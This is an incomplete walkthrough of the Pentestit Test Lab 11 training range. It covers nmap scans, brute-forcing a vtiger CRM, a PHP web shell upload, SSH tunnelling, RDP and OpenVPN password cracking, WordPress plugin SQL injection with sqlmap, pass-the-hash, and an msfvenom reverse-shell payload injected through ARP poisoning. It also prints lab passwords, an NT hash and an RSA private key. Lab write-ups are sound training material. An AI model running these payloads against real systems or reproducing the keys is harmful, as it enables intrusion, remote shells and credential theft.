#  Pentestit - TEST LAB 11

https://lab.pentestit.ru/pentestlabs/7

TODO: [incomplete] used for my reference

Using the [network map](https://lab.pentestit.ru/images/labs/TL11_map.png), we have two public IP address, `192.168.101.10 and 192.168.101.11`

```
root@kali:~# nmap -p- -T4 -A 192.168.101.10

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-08 15:04 BST
Nmap scan report for 192.168.101.10
Host is up (0.027s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE VERSION
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: mail.ptest.lab, PIPELINING, SIZE, ETRN, STARTTLS, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=mail.test.lab/organizationName=mail.test.lab/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2017-04-22T19:19:57
|_Not valid after:  2027-04-20T19:19:57
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    nginx 1.12.1
|_http-title: 403 Forbidden
88/tcp   open  http    nginx 1.6.2
| hadoop-datanode-info: 
|_  Logs: login-header
|_hadoop-jobtracker-info: 
| hadoop-tasktracker-info: 
|_  Logs: login-header
|_hbase-master-info: 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.6.2
|_http-title: Users
1194/tcp open  openvpn OpenVPN
8080/tcp open  http    nginx
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): Crestron 2-Series (87%)
OS CPE: cpe:/o:crestron:2_series
Aggressive OS guesses: Crestron XPanel control system (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host:  mail.ptest.lab

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   21.48 ms 10.10.0.1
2   35.70 ms 172-0-1-1.lightspeed.brhmal.sbcglobal.net (172.0.1.1)
3   35.71 ms 192.168.101.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 634.36 seconds
```

```
root@kali:~# nmap -p- -T4 -A 192.168.101.11

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-08 15:05 BST
Nmap scan report for 192.168.101.11
Host is up (0.047s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 50:f9:23:6f:7e:3f:bb:68:77:5e:44:99:4d:51:9b:92 (DSA)
|   2048 df:da:b6:ac:c8:d6:ee:10:0b:b0:da:87:2f:c9:a3:08 (RSA)
|_  256 e1:3e:b9:12:3e:01:ea:d5:d0:9a:3b:96:da:a8:ce:a5 (ECDSA)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Linux 3.X (87%), Crestron 2-Series (87%)
OS CPE: cpe:/o:linux:linux_kernel:3.2 cpe:/o:crestron:2_series
Aggressive OS guesses: Linux 3.2 (87%), Crestron XPanel control system (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2222/tcp)
HOP RTT      ADDRESS
1   65.76 ms 10.10.0.1
2   65.78 ms 172-0-1-1.lightspeed.brhmal.sbcglobal.net (172.0.1.1)
3   65.78 ms 192.168.101.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1248.71 seconds
```

### CRM Token
http://192.168.101.10/ leads to a wordpress blog, http://192.168.101.10:88 leads to a vtiger CRM 6.3.0 site and http://192.168.101.10:8080 leads to a mail login.

We try to find the CRM token and run nikto and searchsploit to find an exploit, https://www.exploit-db.com/exploits/38345/. However, this requires being login to the administration interface. Maybe, we need to bruteforce the login with hydra. To get the POST parameters, make a login and go to the Developer Tools > Network tab > Edit & Send > Copy the post `index.php?module=Users&action=Login` and request body `__vtrftk=sid%3A7f699a23a4c6ece454157575ebf5a9ae143303f1%2C1507490968&username=admin&password=admin`. Inspecting the page, we can confirm that __vtrftk is the CSRF token. We can use hydra or patator, we just need to obtain the SESSID and CSRF token through curl. Script taken from ijustwannaredteam

```
#!/bin/bash
bulk=$(curl -sD headers.txt -A "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" "http://192.168.101.10:88/index.php")
echo ${bulk}
CSRF=$(echo ${bulk} |grep "sid:" | cut -d ":" -f3 | cut -d ";" -f1)
SESSID=$(cat headers.txt | grep PHPSESSID | cut -d " " -f2 | cut -d ";" -f1)
echo ${CSRF}
echo ${SESSID}

patator http_fuzz url="http://192.168.101.10:88/index.php?module=Users&action=Login" method=POST body="__vtrftk=sid:_CSRF_&username=admin&password=FILE0" 0=/usr/share/wordlists/rockyou.txt follow=1 accept_cookie=0 header="Cookie: ${SESSID}" before_urls="http://192.168.101.10:88/index.php" before_header="Cookie: ${SESSID}" before_egrep='_CSRF_:var csrfMagicToken = "(\S+)"' -x ignore:egrep="Invalid username or password"
```

Logging in with our founded credentials admin:blackstar, we can now use the exploit we found earlier. We can execute commands by uploading a php as an image through the logo upload.

```
root@kali:~# touch shell.jpg
put in <? echo shell_exec($_GET['cmd']); ?>

Goto cog icon > CRM settings > (left toolbar) template > Company Details > upload shell.jpg
With Burp intercept and change the .jpg to .php
Now we can visit: http://192.168.101.10:88/test/logo/shell.php?commands=ls
Browsing the directory, we can find http://192.168.101.10:88/test/logo/shell1.php?cmd=cat%20%20/var/www/rce_token.txt
Give_me_all 
```

### RDP Token

Looking at the emails section, we see admin@test.lab with password darthvadar. We will log in on `192.168.101.10:8080` and find an email with a private RSA key, username tech from Matthew from Office 2.

```
Create privkey with RSA private key
root@kali:~/test# chmod 600 privkey
root@kali:~# ssh tech@192.168.101.11 -p 2222 -i privkey.key
root@kali:~/test# ssh tech@192.168.101.11 -p 2222 -i ~/test/privkey
You have new mail.
Last login: Sun Oct  8 22:57:11 2017 from 10.10.0.90
##########################
PasswordAuthentication no
##########################

3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows

Nmap scan report for 192.168.13.2
Host is up (0.0025s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows

Nmap scan report for 192.168.13.3
Host is up (0.0023s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 30.36 seconds
You have new mail in /var/mail/tech
```

We see that ms-wbt-server is active in the subnet. However, we cannot rdesktop on it on tech as we want to do it on our host (Kali Linux) machine. However, we cannot simply SSH to those IP as we do not have access through our host. Instead, we need to do SSH tunneling through tech and forward the traffic to our host for RDP access on those IP addresses, 192.168.13.1-3. To do this:

```
root@kali:~# ssh -L 3389:192.168.13.2:3389 -i ~/test/privkey tech@192.168.101.11 -p 2222
(in another terminal)
root@kali:~# rdesktop localhost -u ""
```

We don't have credentials for any of the arm users, which is authenticated by the kerboros protocol. But, now we have information about the users from 192.168.13.1-3 which are arm554, arm550 and arm672. We can then bruteforce this with hydra or 

```
hydra -t 8 -v -l arm554 -P /usr/share/wordlists/rockyou.txt rdp://127.0.0.1
or
crowbar -b rdp -u arm554 -C /usr/share/wordlists/rockyou.txt -s 127.0.0.1/32 -v

arm554:tiger

We can run a enumeration script and find an exploit https://www.exploit-db.com/exploits/39719/, we can move this exploit accross by:
root@kali:~# rdesktop -u arm554 -r disk:share=/root/Downloads/ 127.0.0.1 

We can find the token in the users folder. Before leaving, we explore the other files and keep:

C:\Users\user\Old test.lab users\arm440>type "New Text Document.txt"
F12A08F680CD09E4194D463C8AE6DA0C
```

### Site Token

`192.168.101.10:80` gives a word press, we can see it uses kittycatfish plguin from the source code. wpscan is blocked, probably because of WAF. We do a searchsploit of the plugin to find an SQL injection exploit, https://www.exploit-db.com/exploits/41919/.

We notice that http://192.168.101.10/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=15, altering kc_ad=15 results in changing the css code to say TRUE/FALSE. E.g. left: 50%; is sometimes : px;. Running sql map gets access forbidden 403. I reckon we need to bypass the WAF.

Going back to the tech terminal, we check for running processes and programs `ps -aux and dpkg-query -l`. There is OpenVPN again, looking at https://lab.pentestit.ru/images/labs/TL11_map.png, it is possible that 192.168.101.11 is using OpenVPN to connect to 192.168.101.10 via port 1194. So, if we can establish a VPN connection to 192.168.101.10, we can bypass the WAF protecting SITE, 172.16.0.11.


```
tech@tl11-gw-2:~$ cd /etc/openvpn/
tech@tl11-gw-2:/etc/openvpn$ ls
server.conf  update-resolv-conf
tech@tl11-gw-2:/etc/openvpn$ cat server.conf
client
dev tun
proto tcp
remote 192.168.101.10 1194
remote-cert-tls server

#####
#ping 3
#ping-restart 60
#####

script-security 2

up	/etc/openvpn/update-resolv-conf
down	/etc/openvpn/update-resolv-conf

## auth for Office-2 user
auth-user-pass "/opt/openvpn/auth.txt"

resolv-retry infinite
persist-key
persist-tun
comp-lzo

<ca>
-----BEGIN CERTIFICATE-----
MIIEXjCCA0agAwIBAgIJAKYiQCcisQFFMA0GCSqGSIb3DQEBCwUAMHwxCzAJBgNV
BAYTAlJVMQ8wDQYDVQQIEwZNb3Njb3cxDzANBgNVBAcTBk1vc2NvdzERMA8GA1UE
ChMIQ29tYXBhbnkxCzAJBgNVBAsTAklUMRkwFwYDVQQDExBjb21wYW55LnRlc3Qu
bGFiMRAwDgYDVQQpEwdFYXN5UlNBMB4XDTE3MDQwMjE0NDIzMFoXDTI3MDMzMTE0
NDIzMFowfDELMAkGA1UEBhMCUlUxDzANBgNVBAgTBk1vc2NvdzEPMA0GA1UEBxMG
TW9zY293MREwDwYDVQQKEwhDb21hcGFueTELMAkGA1UECxMCSVQxGTAXBgNVBAMT
EGNvbXBhbnkudGVzdC5sYWIxEDAOBgNVBCkTB0Vhc3lSU0EwggEiMA0GCSqGSIb3
DQEBAQUAA4IBDwAwggEKAoIBAQDdcIqS/FA1M8NhiFfiQFKdxUMePwHK2UgmshXS
48Jeshl7qjHAfLQl2Pex83gbNWud9av4yp1H4m3iwGaqTQPaxgOmzoV6vMN3Hnt7
Vk9eqTpGaODFC6IrSrnE9bYL7E90ra0PWHZY9dshup/L+uasg7OrUHHQhXV6e5GR
C0jAmqUp8Wj61DZDuyvkQE8nDUUdxEObUgdZF5dq4aHKkBFL1iC3+f+aSA6//QTM
kNYzrGv2s0cpkZI8zV4ZT+YgXgWMBJfszIU1AFegNLfksgpyR+IP3YjjkQ4s6wQd
HBTkWsLSf4zusgTYkHpG3mP0z4o7/r4RiEywrJidgE5cN2wbAgMBAAGjgeIwgd8w
HQYDVR0OBBYEFONOp29lTyyDD8E1wzF+rOl1LAlcMIGvBgNVHSMEgacwgaSAFONO
p29lTyyDD8E1wzF+rOl1LAlcoYGApH4wfDELMAkGA1UEBhMCUlUxDzANBgNVBAgT
Bk1vc2NvdzEPMA0GA1UEBxMGTW9zY293MREwDwYDVQQKEwhDb21hcGFueTELMAkG
A1UECxMCSVQxGTAXBgNVBAMTEGNvbXBhbnkudGVzdC5sYWIxEDAOBgNVBCkTB0Vh
c3lSU0GCCQCmIkAnIrEBRTAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IB
AQBYVZ+3ZjvMjOjOk8zgmMWHaf153ptbFf53c1YtxmDFKWbDo7mG0JmN318T+Kh/
/fxNOha1a2WdQ97yPCR8llz08ZIWLm2n38JdhWCuSZPsozYIGOQX1rZ4lj+8T0kb
hF1vr0KOCI6ODTwPEPJwAd9mcdRQK0Jd52WvuvdGQKUC8DPPDo4B2VHAn8KIDIJp
b+mecHvvxGTSzo4k5nz4bdpYit9i9HayvJ3uIjt05jciQkp5bi5YUXEpq0cspNLr
awoYzU/p/oTvFG8sn8EWAl6pPonQUCGka7GRG2Q9Na9QysMG8H5hITZ7d5VngyrJ
vwj14awsaPvMoIgk8C8Zrkuu
-----END CERTIFICATE-----
</ca>

log /var/log/openvpn-client.log
verb 3

Now remove auth-user-pass "/opt/openvpn/auth.txt" and save it on host machine as server.conf and separate the certificate in openvpn.crt

root@kali:~/test# python crowbar.py -s 192.168.101.10/32 -b openvpn --config ~/test/server.conf --username Office-2 -k ~/test/openvpn.crt -C /usr/share/wordlists/rockyou.txt

(store in a another file called pass.txt)
Office-2
starwars

Add back: auth-user-pass "/opt/openvpn/pass.txt"

root@kali:~/test# openvpn --config ~/test/server.conf &
[1] 59639

Now we have access to SITE without the WAF
```


Now we can use SQL injection without getting 403 access code.

```
http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,%28select%20@@version%29

http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,%28SELECT%20GROUP_CONCAT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema=database%28%29%20GROUP%20BY%20table_name%20LIMIT%200,1%29

http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name=0x746c5f746f6b656e%20GROUP%20BY%20table_name%20LIMIT%200,1)

OR

sqlmap -u "http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16"  --dbms=mysql --level=5 --risk=3 -v 3 --threads 10 --string="left: 50%;"

sqlmap --random-agent -u "http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16" --dbms=mysql --level=5 --risk=3 -v 3 --threads 10 --string="left: 50%;" -D testlabdb -T tl_token --dump

```

### CUPS Token

Now that we have a vpn connection to 192.168.101.10, we can connect to CUPS, http://172.16.0.14. We are presented with a login screen which can be bypassed by ’ OR 1=1;–

There we have a convert one of the file name hex to ascii and also save one one the RSA private key for later use.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4CxmKK2/kvV0+srp24bVZm+yYvCz+rvgHHxX1w7F0oD8aUDI
won79K9XpntFDPUvtJRMg9WqK/zKUwLsMQLGWT66PT4GVbQw4Nr56rOrBIuag/qg
o9WcX0AfIyFYFCNz0TnLfRXSDcSQY0CRK8WfKx5c8uP2kudtzAGv5GQCpSjM2uNV
shOu7xmgo/AMUQvPi8kvD/gAme9G8WkTgpVpAwlsthjxQ9fEO6abHHkjbGGec0O8
4T7Bo2nU8bHjr6Jd+dzUAvytblG1yNvGIybAFAsVqUHjbt9wGZgFKr1kA+3ZCbyF
qFZZ37dpZr2grZXwzlCtPUJGuMfCq7N0ZhmcAwIDAQABAoIBAQDCXPx+TJcLXhJ8
164HjlI8LKAoNLZ3sKlRSWYHqmFOcFNpFqh6M5Tmw5hlWf+2imdAVEw7Cegvl0/8
xU3v+I3tFvv22W44pLC0ZGfHXNvsZvYjdAwPwMeBtmDI3sI1Q7/JKikKXP7wvPrL
c1Hq979XbU39sjU5jbqe5N+SUDwS4Tu79L0uXehnqvCSlyIU9joDhvW87DeaLRaQ
wwkKR9gnPtiKebZ73VGParJ42CZlRgfEOvoLWUk+YrhRfZ9r4uva0IHbZ1LhqNcL
k0OlKEDUDzuju0/YwgBSZVSrhkCAnCnipsxQMc4g2aytPOTdKz4BtF+cZV/rXhyM
kSPIeh1xAoGBAPJfcCQWqsq/dwwOC9I9jWj4W9xAFPbaPSq1oGwNr0ugZ/4DZLGe
glGte8iG/Tc1Lb1Ege2dYPRR5OeFhyo8tADPKleFvDBYGN2asf4JirljxrW5F+ON
q5paXqjbaBKk/Z6f08UlwxjSHRHOWqEvYZkm5bAxrufNKBVpwVWHU6eNAoGBAOzH
AryHBdo45qLnzJR87zDftNNrualVmhWu+h+I7zj4hr52gM/TheHL/ODJZCyZU3vt
7ncDjUM91xwh63vkCiByEYk4vTGnmaj9brmndracJ7jwwSUn/YqPj0D3yD0lrpxd
PLn0c1ic5jaoTSWZN748PoPnP+CPvhjQYvxX5OXPAoGALmnEScTlc+nyXCaccOhE
miNlQ+opmZP1PqaFT+vw876F64iu0ayu/AEiwSXIe7f9SE9EKkKG/IJqOUPCvH3f
YoBIdXUwsnlMWbNz/lfJbvMCbG5Detn4UJiZo/BQH7Hht2mX3hr7H1etJWnExTUT
lYZzWahI/C23TVJxKXW+uUkCgYEAnLDOhMit/M3vAxt27UUIXUWNuuPtSmH9yB+1
cq0B8qe1M9HkSKRoUxbVUES2QDVvY/H+/0+gakFAW2OvHJu6f+I87JxZx8RsEcM1
RTMngo0wVFku2FHwnYOHf6z6HE0VknC5QS4eLyQVzVHvS9RraT8g99VPFmLKoE43
U1svJU0CgYAecYtH3ZvIwPA85sTuTkKAGMmvRxzPnQkyjUF9BwN+B1mfL4uZyJVy
VVWhCwXf/h9G3fKzuV0m0Dz6O7r5DqRqs0uCNbxPaS8qWPcRckwV2Y9htMjXLtXU
nOV4UZBbQSZb/AoSFdcCBjonbudkiAxzm0STdiQ92kZNavvfZAjXQw==
-----END RSA PRIVATE KEY-----
```

### AD Token

We do an `nmap -A -sV -n 172.16.0.10`. We can connect to the SMBclient and remember we had a hash earlier. We can try Pass the Hash method: `pth-smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361DEA164EE8FE91FE7B117FBC9CA5E`. We can use an MS17-010 exploit. Then we can search the dir to find token.txt and network_test.txt which says `Hi, mate! Need to test ARP-table in DIR subnet. I'll install intercepter admin:77_GrantedSuperAdmin_77`


### DIR Token

We can log in as Morgan using the RSA key we found earlier. We can set up a ssh tunnel like earlier and do an nmap of each individually.

```
root@kali:~# ssh -L 3389: 192.168.12.2:3389 -i ~/test/morgankey morgan@172.16.0.252
(in another terminal)
root@kali:~# rdesktop localhost -u ""
```

From there run Interceptor-NG for ARP Poisoning. Do a Smart Scan and use 192.168.12.3 for DHCP Mode > RAW Mode > PCAP filter > start. Find quake3.exe and on host `root@kali:~/pentestit# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.88 LPORT=80 -f exe > quake3.exe` and either nc or share file the malicious .exe over and inject it through interceptor with `nc -lvp 80`

